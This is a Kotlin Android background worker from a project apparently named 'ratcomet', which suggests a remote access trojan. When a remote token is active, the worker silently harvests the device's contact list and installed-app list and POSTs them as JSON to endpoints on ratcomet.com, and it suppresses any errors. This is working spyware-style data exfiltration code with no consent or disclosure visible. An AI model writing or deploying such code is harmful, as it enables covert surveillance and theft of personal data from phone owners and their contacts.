package ug.hix.ratcomet.workers

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.github.kittinunf.fuel.core.extensions.jsonBody
import com.github.kittinunf.fuel.httpPost
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import ug.hix.ratcomet.Phone
import ug.hix.ratcomet.Repository
import ug.hix.ratcomet.util.CometUtil

class OneDayWorker(private val appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result  = withContext(Dispatchers.IO){
        val TAG = javaClass.simpleName
        val repo = Repository(appContext)
        val phone = Phone(appContext)

       try {
            coroutineScope {
                val isActive =  CometUtil.isActiveToken(repo)
                if (isActive == "true") {
                    launch {
                        val contacts = phone.contactList()
                        if (contacts.isNotEmpty()) {
                            "https://ratcomet.com/api/contacts".httpPost()
                                .jsonBody(Gson().toJson(contacts))
                                .responseString()

                        }
                    }
                    launch {
                        val appList = phone.installedApps()
                        if (appList.isNotEmpty()) {
                            "https://ratcomet.com/api/apps".httpPost()
                                .jsonBody(Gson().toJson(appList))
                                .responseString()

                        }
                    }
                }
            }

            Result.success()
        } catch (e: Exception) {
//            Log.e(TAG,"Worker Failed",e)
            Result.failure()
        }
    }
}